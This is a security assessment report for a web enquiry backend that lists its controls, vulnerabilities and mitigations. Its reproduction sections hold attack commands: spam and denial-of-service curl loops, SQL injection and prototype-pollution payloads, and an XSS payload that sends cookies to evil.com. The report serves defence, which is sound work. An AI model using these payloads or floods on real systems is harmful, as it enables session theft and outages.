# Security Report

Security assessment of the Enquiry Backend Platform, including vulnerability analysis, threat scenario response, and mitigation strategies.

---

## Table of Contents

1. [Security Controls Implemented](#security-controls-implemented)
2. [Vulnerability Assessment](#vulnerability-assessment)
3. [Threat Scenario Analysis](#threat-scenario-analysis)
4. [Residual Risks & Recommendations](#residual-risks--recommendations)

---

## Security Controls Implemented

| Layer | Control | Implementation |
|-------|---------|---------------|
| Network | Firewall (UFW) | Only ports 80, 443, 2222 open |
| Network | SSH hardening | Port 2222, key-only, no root login, fail2ban |
| Transport | TLS 1.2/1.3 | Let's Encrypt with HSTS preload |
| Application | Rate limiting (L1) | Nginx `limit_req_zone` — 100r/m general, 10r/m enquiry POST |
| Application | Rate limiting (L2) | NestJS guard with Redis sliding window + in-memory fallback |
| Application | Input sanitization | Global `SanitizationPipe` — strips HTML, escapes special chars |
| Application | Request validation | `class-validator` with strict DTOs, `MaxLength` constraints |
| Application | HMAC signature verification | Timing-safe `crypto.timingSafeEqual` on webhook payloads |
| Application | API key authentication | Webhook endpoints gated by `ApiKeyGuard` |
| Application | Admin authentication | Admin endpoints gated by `AdminAuthGuard` (API key) |
| Application | Idempotency keys | Duplicate submission prevention for enquiries |
| Application | Content-Type enforcement | `ContentTypeGuard` rejects non-JSON bodies |
| Application | Security headers | Helmet + Nginx (X-Frame-Options, CSP, HSTS, X-Content-Type-Options) |
| Application | Error sanitization | `GlobalExceptionFilter` never leaks stack traces or internal details |
| Application | Load shedding | Event loop lag monitoring rejects requests under extreme load |
| Application | Graceful shutdown | 30s drain period ensures in-flight requests complete |
| Database | Parameterized queries | Prisma ORM (no raw SQL interpolation) |
| Database | Connection pooling | Bounded pool (max 10) prevents connection exhaustion |
| Infrastructure | Non-root container | Dockerfile uses `appuser` (non-root) |
| Infrastructure | Kernel hardening | sysctl: SYN cookies, no redirects, ASLR |
| Infrastructure | Auto-updates | Unattended security upgrades enabled |
| Monitoring | Audit logging | All state changes recorded with before/after snapshots |

---

## Vulnerability Assessment

### 1. Insufficient Admin Endpoint Protection

| Field | Value |
|-------|-------|
| **Vulnerability Name** | Static API key authentication for admin endpoints |
| **OWASP Category** | A07:2021 – Identification and Authentication Failures |
| **Severity** | Medium |
| **Affected File & Line** | `backend/src/modules/admin/guards/admin-auth.guard.ts:18` |
| **Description** | Admin endpoints (queue management, DLQ retry) are protected by a single static API key (`ADMIN_API_KEY` env var). There is no session management, MFA, or role-based access control. |
| **Business Impact** | If the API key is leaked (logs, env dump, source control), an attacker can pause queues, retry jobs, and view internal queue statistics. |
| **Proof of Concept** | `curl -H "X-Admin-Key: <leaked-key>" https://target/admin/queues/stats` |
| **Recommended Fix** | 1. Rotate keys regularly. 2. Restrict admin endpoints to internal network or VPN. 3. Consider JWT-based auth with short-lived tokens and role claims for production. |

---

### 2. CORS Wildcard in Development

| Field | Value |
|-------|-------|
| **Vulnerability Name** | Permissive CORS configuration in development |
| **OWASP Category** | A05:2021 – Security Misconfiguration |
| **Severity** | Low |
| **Affected File & Line** | `backend/.env.example:48` (`CORS_ORIGINS=*` default in dev) |
| **Description** | The `CORS_ORIGINS` env var defaults to `*` in development. If accidentally deployed with dev config, any origin could make credentialed requests. |
| **Business Impact** | Cross-origin data theft if deployed with wildcard CORS and sensitive cookies. |
| **Proof of Concept** | Deploy with `CORS_ORIGINS=*`, then from `evil-site.com` make fetch requests to the API. |
| **Recommended Fix** | Already mitigated: production `.env` sets explicit origins. Add startup validation to reject `*` when `NODE_ENV=production`. Config validation via Joi already enforces required values. |

---

### 3. Rate Limit Bypass via X-Forwarded-For Spoofing

| Field | Value |
|-------|-------|
| **Vulnerability Name** | IP-based rate limiting trusts X-Forwarded-For header |
| **OWASP Category** | A04:2021 – Insecure Design |
| **Severity** | Medium |
| **Affected File & Line** | `backend/src/common/guards/rate-limit.guard.ts:152` |
| **Description** | The rate limit guard extracts client IP from `X-Forwarded-For` header. Without Nginx's `set_real_ip_from` restricting trusted proxies, attackers can rotate spoofed IPs to bypass per-IP rate limits. |
| **Business Impact** | Attacker can exceed rate limits by varying the X-Forwarded-For header, enabling brute force or spam. |
| **Proof of Concept** | `for i in $(seq 1 100); do curl -H "X-Forwarded-For: 1.2.3.$i" -X POST .../api/v1/enquiry; done` |
| **Recommended Fix** | Already mitigated at Nginx layer: Nginx sets `X-Real-IP` from the actual connection IP. The application should prefer `X-Real-IP` (set by trusted proxy) over raw `X-Forwarded-For`. Additionally, Nginx L1 rate limiting applies regardless of application-layer bypass. |

---

### 4. Missing Request Body Size Limit at Application Layer

| Field | Value |
|-------|-------|
| **Vulnerability Name** | No explicit body size limit in NestJS (relies on Nginx) |
| **OWASP Category** | A05:2021 – Security Misconfiguration |
| **Severity** | Low |
| **Affected File & Line** | `nginx/nginx.conf:31` (`client_max_body_size 1m`) |
| **Description** | The body size limit (1MB) is enforced only at the Nginx layer. If the application is accessed directly (bypassing Nginx), there's no Express-level body size limit. |
| **Business Impact** | Memory exhaustion if large payloads are sent directly to the application (unlikely in production due to firewall, but possible in development). |
| **Proof of Concept** | Send a 50MB JSON body directly to port 3000 (bypassing Nginx). |
| **Recommended Fix** | Add `app.use(express.json({ limit: '1mb' }))` in `main.ts`. Defence in depth: both Nginx and Express should enforce the limit. |

---

### 5. WordPress Admin Exposed with Weak Default Credentials

| Field | Value |
|-------|-------|
| **Vulnerability Name** | Default WordPress admin credentials in environment |
| **OWASP Category** | A07:2021 – Identification and Authentication Failures |
| **Severity** | High (if deployed with defaults) |
| **Affected File & Line** | `backend/.env.example:28` (`WP_ADMIN_PASSWORD=admin123`) |
| **Description** | The WordPress admin credentials are set via environment variables with weak defaults (`admin/admin123`). If deployed without changing these, the WordPress admin panel is accessible with trivial credentials. |
| **Business Impact** | Full WordPress CMS compromise — attacker can modify property content, inject malicious scripts, or pivot to the backend database. |
| **Proof of Concept** | Navigate to `https://target:8080/wp-admin` and log in with `admin/admin123`. |
| **Recommended Fix** | 1. Use strong passwords in production `.env`. 2. Restrict WordPress admin access to internal network. 3. The docker-compose.prod.yml should not expose port 8080 externally (already the case — WordPress is internal-only in production). |

---

### 6. Swagger UI Information Disclosure

| Field | Value |
|-------|-------|
| **Vulnerability Name** | API documentation endpoint exposure |
| **OWASP Category** | A01:2021 – Broken Access Control |
| **Severity** | Low |
| **Affected File & Line** | `backend/.env.example:24` (`SWAGGER_ENABLED=true`) |
| **Description** | Swagger UI at `/api/docs` exposes all API endpoints, DTOs, and authentication schemes. If accidentally enabled in production, it provides an attacker with a complete API surface map. |
| **Business Impact** | Reconnaissance aid — reduces attacker effort for discovering endpoints and expected payloads. |
| **Proof of Concept** | Access `https://target/api/docs` when `SWAGGER_ENABLED=true`. |
| **Recommended Fix** | Already mitigated: production config sets `SWAGGER_ENABLED=false`. The config validation should reject `SWAGGER_ENABLED=true` when `NODE_ENV=production` as a safety net. |

---

### 7. Potential Denial of Service via Regex in Sanitization Pipe

| Field | Value |
|-------|-------|
| **Vulnerability Name** | Regex-based HTML stripping without input length pre-check |
| **OWASP Category** | A06:2021 – Vulnerable and Outdated Components (ReDoS) |
| **Severity** | Low |
| **Affected File & Line** | `backend/src/common/pipes/sanitization.pipe.ts:82` |
| **Description** | The HTML tag stripping regex `/<[^>]*>/g` is applied to all string fields. While this particular pattern is not catastrophically backtracking, extremely long strings (if body limit is bypassed) could cause CPU spikes. |
| **Business Impact** | Temporary CPU exhaustion processing malformed inputs. |
| **Proof of Concept** | Send a string with thousands of `<` characters without closing `>`. |
| **Recommended Fix** | Already mitigated by: (1) Nginx `client_max_body_size 1m`, (2) `@MaxLength()` validators on all DTO fields (100-2000 chars). Add Express-level body limit as defence in depth. |

---

## Threat Scenario Analysis

### Scenario 1: Flood Platform with Fake Enquiries

> "I want to flood the platform with thousands of fake enquiries using automated scripts."

**How the Attack Works:**
An attacker writes a script that sends rapid POST requests to `/api/v1/enquiry` with randomized data, attempting to fill the database with garbage entries and overwhelm the processing pipeline.

**Business Impact:**
- Database pollution with thousands of fake records
- BullMQ queues flooded with fake CRM sync / email jobs
- Legitimate enquiries buried in noise
- Increased infrastructure costs
- Degraded response times for real users

**How to Reproduce:**
```bash
for i in $(seq 1 5000); do
  curl -X POST https://target/api/v1/enquiry \
    -H "Content-Type: application/json" \
    -d '{"name":"Bot'$i'","email":"bot'$i'@fake.com","propertyId":"prop-1","propertyTitle":"Test","message":"Spam","source":"bot","consentGiven":true}'
done
```

**Implemented Mitigations:**
1. **Nginx L1 rate limit:** `limit_req zone=enquiry_post rate=10r/m burst=5` — max 10 enquiry submissions per minute per IP
2. **Application L2 rate limit:** `@RateLimit({ limit: 10, window: 60, scope: 'ip' })` — sliding window via Redis
3. **Duplicate detection:** Same email + propertyId within 10 minutes is rejected as duplicate (409 Conflict)
4. **Idempotency keys:** Repeated requests with the same `Idempotency-Key` header return the original response without creating duplicates
5. **Input validation:** All fields are validated (email format, max lengths) — random garbage is rejected at the validation layer
6. **Load shedding:** Under extreme load, event loop lag > 200ms triggers 503 responses, protecting the system from total failure

---

### Scenario 2: Abuse CRM Webhook Endpoint

> "I want to abuse the CRM webhook endpoint to inject malicious data into the system."

**How the Attack Works:**
An attacker sends crafted POST requests to `/api/v1/webhook/crm` with malicious payloads (XSS scripts, SQL injection attempts, oversized data) hoping to corrupt the database or exploit downstream processing.

**Business Impact:**
- Corrupted enquiry data (status changes to invalid states)
- XSS payloads stored in database, rendered to admin users
- Potential command injection if payload is processed unsafely
- CRM integration disruption

**How to Reproduce:**
```bash
# Without valid credentials (rejected):
curl -X POST https://target/api/v1/webhook/crm \
  -H "Content-Type: application/json" \
  -d '{"eventId":"evt_1","type":"<script>alert(1)</script>","source":"evil","payload":{"sql":"1; DROP TABLE enquiries;--"}}'

# With stolen API key but invalid HMAC (rejected):
curl -X POST https://target/api/v1/webhook/crm \
  -H "Content-Type: application/json" \
  -H "X-API-Key: stolen-key" \
  -H "X-Webhook-Signature: sha256=invalid" \
  -d '{"eventId":"evt_1","type":"malicious","source":"evil","payload":{}}'
```

**Implemented Mitigations:**
1. **API Key authentication:** `ApiKeyGuard` requires valid `X-API-Key` header — rejects 403 without it
2. **HMAC signature verification:** `HmacGuard` validates `X-Webhook-Signature` using timing-safe comparison — even with a valid API key, the request body must be signed with the shared secret
3. **Input sanitization:** `SanitizationPipe` strips HTML tags and escapes special characters from all string fields
4. **Schema validation:** `class-validator` enforces field types, required fields, and constraints — malformed payloads are rejected with 422
5. **Parameterized queries:** Prisma ORM uses parameterized queries — SQL injection is impossible regardless of payload content
6. **Event deduplication:** Duplicate `eventId` values are detected and return 200 (idempotent) without reprocessing
7. **Rate limiting:** 200 requests/minute per API key — limits damage even with compromised credentials

---

### Scenario 3: Overload API with Repeated Requests

> "I want to overload the API with repeated requests and crash the backend."

**How the Attack Works:**
Distributed Denial of Service (DDoS) or single-source flooding — attacker sends thousands of requests per second to exhaust server resources (CPU, memory, connection pool, event loop).

**Business Impact:**
- Service unavailability for all users
- Database connection pool exhaustion
- Redis memory pressure
- Potential data loss if queues overflow
- Revenue loss during downtime

**How to Reproduce:**
```bash
# Using k6 or ab:
ab -n 100000 -c 500 https://target/api/v1/enquiries

# Or a simple loop:
while true; do curl -s https://target/api/v1/enquiries > /dev/null & done
```

**Implemented Mitigations:**
1. **Nginx connection limiting:** `limit_conn zone=conn 50` — max 50 concurrent connections per IP
2. **Nginx request rate limiting:** 100 requests/minute per IP for general API endpoints
3. **Application rate limiting:** Redis-backed sliding window counters with per-endpoint limits
4. **Load shedding with hysteresis:** When event loop lag exceeds 200ms, the system responds with 503 + Retry-After header. Resumes only when lag drops below 100ms (prevents oscillation).
5. **PM2 cluster mode:** Multiple worker processes — one overloaded worker doesn't crash the entire service
6. **Graceful shutdown:** 30s drain timeout ensures in-flight requests complete even during restarts
7. **fail2ban:** Nginx rate limit violations (10+ occurrences) trigger IP ban for 600 seconds at the firewall level
8. **Resource limits:** Docker `deploy.resources.limits` caps memory (1GB) and CPU (2 cores) preventing resource starvation of other services
9. **Connection pool bounds:** Database pool max 10 connections — prevents connection exhaustion cascade
10. **Keepalive connections:** Nginx upstream keepalive (64 connections) reduces connection establishment overhead

---

### Scenario 4: Retrieve Sensitive Information from API Errors

> "I want to retrieve sensitive server or environment information from API errors."

**How the Attack Works:**
Attacker sends malformed requests, invalid parameters, or triggers edge-case errors hoping the API returns stack traces, file paths, database connection strings, or internal architecture details.

**Business Impact:**
- Exposure of internal file paths reveals technology stack and project structure
- Database connection strings expose credentials
- Stack traces reveal framework versions (enables targeted exploits)
- Environment variables may contain API keys and secrets

**How to Reproduce:**
```bash
# Trigger a 404 with invalid UUID:
curl https://target/api/v1/enquiry/not-a-uuid

# Trigger validation error:
curl -X POST https://target/api/v1/enquiry -H "Content-Type: application/json" -d '{}'

# Trigger 500 with unexpected input:
curl -X POST https://target/api/v1/enquiry -H "Content-Type: application/json" -d '{"__proto__":{"polluted":true}}'
```

**Implemented Mitigations:**
1. **GlobalExceptionFilter:** All unhandled exceptions are caught and return a generic `"An unexpected error occurred"` message with standardized error codes — never stack traces
2. **Structured error responses:** Validation errors return field names and constraints, but no internal implementation details
3. **Prisma error handling:** Database errors are mapped to generic messages (`"A database error occurred"`) — never raw SQL or connection info
4. **Server token hiding:** `server_tokens off` in Nginx — no version disclosure
5. **Security headers:** `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY` prevent information leakage via browser features
6. **Production logging:** Stack traces are logged server-side at ERROR level (visible in Loki) but never returned to clients
7. **Swagger disabled:** API documentation endpoint disabled in production

---

### Scenario 5: Exploit Weak Validation for Malicious Payloads

> "I want to exploit weak validation to inject malicious payloads into the database."

**How the Attack Works:**
Attacker crafts input with SQL injection, XSS scripts, NoSQL injection, or path traversal payloads in form fields, hoping they're stored in the database and either executed during processing or rendered to other users.

**Business Impact:**
- Stored XSS: malicious scripts execute in admin browser sessions (session hijacking, data theft)
- SQL injection: full database read/write/delete capability
- Data corruption: invalid state transitions or data integrity violations

**How to Reproduce:**
```bash
# XSS attempt in name field:
curl -X POST https://target/api/v1/enquiry \
  -H "Content-Type: application/json" \
  -d '{"name":"<script>document.location=\"http://evil.com/steal?c=\"+document.cookie</script>","email":"test@test.com","propertyId":"p1","propertyTitle":"Test","message":"hi","source":"web","consentGiven":true}'

# SQL injection attempt in search:
curl "https://target/api/v1/enquiries?search='; DROP TABLE enquiries; --"

# Prototype pollution attempt:
curl -X POST https://target/api/v1/enquiry \
  -H "Content-Type: application/json" \
  -d '{"name":"test","email":"test@test.com","propertyId":"p1","propertyTitle":"Test","message":"hi","source":"web","consentGiven":true,"__proto__":{"isAdmin":true}}'
```

**Implemented Mitigations:**
1. **SanitizationPipe (global):** Strips all HTML tags (`<script>`, `<img onerror=...>`, etc.) and escapes `&`, `<`, `>`, `"`, `'` to HTML entities before data reaches the service layer
2. **class-validator:** Strict type checking — only declared DTO properties are accepted. `@IsString()`, `@IsEmail()`, `@MaxLength()` reject malformed input
3. **Prisma ORM:** All database operations use parameterized queries — SQL injection is structurally impossible regardless of input content
4. **ValidationPipe with whitelist:** `whitelist: true` strips any properties not defined in the DTO — prototype pollution payloads like `__proto__` are silently removed
5. **Content-Type enforcement:** `ContentTypeGuard` rejects requests without `application/json` — prevents multipart or form-encoded bypass attempts
6. **MaxLength constraints:** All string fields have explicit limits (100-2000 chars) preventing oversized payloads
7. **Email normalization:** Email fields are lowercased and validated against RFC 5322 format

---

## Residual Risks & Recommendations

| Risk | Current State | Recommendation | Priority |
|------|--------------|----------------|----------|
| No WAF | Relies on application-level checks | Consider Cloudflare or DigitalOcean Cloud Firewall for DDoS mitigation | Medium |
| Single API key for admin | Static key in env var | Implement JWT with short-lived tokens and refresh rotation | Low (demo) |
| No CAPTCHA on enquiry form | Rate limiting only | Add reCAPTCHA v3 or hCaptcha for bot prevention at scale | Low (demo) |
| No IP allowlist for webhooks | API key + HMAC only | Add CRM IP allowlist in Nginx for webhook endpoints | Low |
| Secrets in env files | Managed via `.env` files on VPS | Use a secrets manager (Vault, AWS Secrets Manager) for production at scale | Low (demo) |
| No database encryption at rest | Standard PostgreSQL | Enable pgcrypto or full-disk encryption for PII compliance | Low |
| No penetration test performed | Self-assessment only | Engage external pentester before handling real user data | High (pre-production) |

---

## Assessment Summary

The application implements **defence in depth** across network, transport, application, and infrastructure layers. The most critical attack vectors (injection, authentication bypass, DDoS) are mitigated through multiple overlapping controls:

- **Injection attacks** are prevented by Prisma's parameterized queries, global input sanitization, and strict DTO validation
- **Authentication failures** are mitigated by HMAC signature verification with timing-safe comparison and API key rotation support
- **Rate limiting** operates at three tiers (Nginx L1, application L2, per-endpoint L3) with fail2ban escalation
- **Information disclosure** is prevented by the GlobalExceptionFilter and Nginx server token suppression
- **DDoS resilience** is achieved through load shedding, connection limits, and PM2 cluster mode

For a demonstration/assessment context, the security posture is production-appropriate. For handling real PII at scale, the residual risks above should be addressed.
